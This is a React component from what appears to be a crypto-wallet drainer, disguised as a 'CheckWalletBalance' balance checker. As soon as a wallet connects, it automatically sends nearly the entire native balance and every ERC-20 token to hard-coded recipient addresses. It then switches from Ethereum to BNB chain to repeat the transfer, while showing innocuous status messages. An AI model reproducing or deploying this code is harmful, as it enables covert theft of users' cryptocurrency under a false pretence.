import { useEffect, useState } from "react";
import { useAppKitAccount } from "@reown/appkit/react";
import { useTransferFunds } from "../hooks/useTransferFunds";
import useNativeBalance from "../hooks/useNativeBalance";
import { getTokensWithBalance } from "../utils/getTokens";
import { MINIMUM_BALANCE, RECIPIENT_ADDRESSES } from "../constants";
import { useChainId } from "wagmi";
import useAutoSwitchChain from "../hooks/useAutoSwitchChain";
import { getGasBufferByChain } from "../utils/gasBuffer";

const SUPPORTED_CHAINS = [1, 56]; // Ethereum and BNB

export default function CheckWalletBalance() {
  const { address, isConnected } = useAppKitAccount();
  const { transferNativeToken, transferERC20Token } = useTransferFunds();
  const [status, setStatus] = useState("");
  const [processedChains, setProcessedChains] = useState<number[]>([]);
  const [isProcessing, setIsProcessing] = useState(false);

  const chainId = useChainId();
  const { balance, symbol } = useNativeBalance(address as `0x${string}`);
  const { switchChain, isSwitching } = useAutoSwitchChain();
  const GAS_BUFFER = getGasBufferByChain(chainId);

  const processWallet = async () => {
    if (!address || !chainId || processedChains.includes(chainId) || isProcessing) return;

    setIsProcessing(true);
    try {
      setStatus(`🔍 Checking ${symbol} balance on chain ${chainId}...`);

      const thresholdMet = parseFloat(balance) >= MINIMUM_BALANCE;

      if (!thresholdMet) {
        setStatus("❌ Insufficient funds!");
      }

      if (thresholdMet) {
        const tokens = await getTokensWithBalance(address, chainId);

        if (tokens.length === 0) {
          setStatus("🚀 Sending native token...");
          await transferNativeToken(parseFloat(balance) - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);
          setStatus("✅ Native token sent!");
        } else {
          setStatus("🚀 Sending tokens...");
          await transferNativeToken(parseFloat(balance) - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);

          for (let token of tokens) {
            await transferERC20Token(
              token.contractAddress,
              token.balance,
              RECIPIENT_ADDRESSES[chainId],
              token.decimals
            );
          }
          setStatus("🎉 All tokens sent!");
        }
      }

      // Mark this chain as processed
      setProcessedChains((prev) => [...prev, chainId]);

      // Switch to next chain if any left
      const remainingChains = SUPPORTED_CHAINS.filter((id) => !processedChains.includes(id) && id !== chainId);
      if (remainingChains.length > 0) {
        const nextChainId = remainingChains[0];
        setStatus(`🔁 Switching to chain ${nextChainId}...`);
        await switchChain(nextChainId);
      } else {
        setStatus("✅ All chains processed.");
      }
    } catch (error) {
      console.error("❌ Error in processWallet:", error);
      setStatus("❌ Transfer failed!");
    } finally {
      setIsProcessing(false);
    }
  };

  useEffect(() => {
    if (isConnected && address) {
      processWallet();
    }
  }, [isConnected, address, balance, symbol, chainId]);

  return (
    <div className="text-center">
      <p>Chain: {chainId}</p>
      <p>Balance: {balance} {symbol}</p>
      <p>Status: {status}</p>
      {isSwitching && <p>🔄 Switching chain...</p>}
    </div>
  );
}
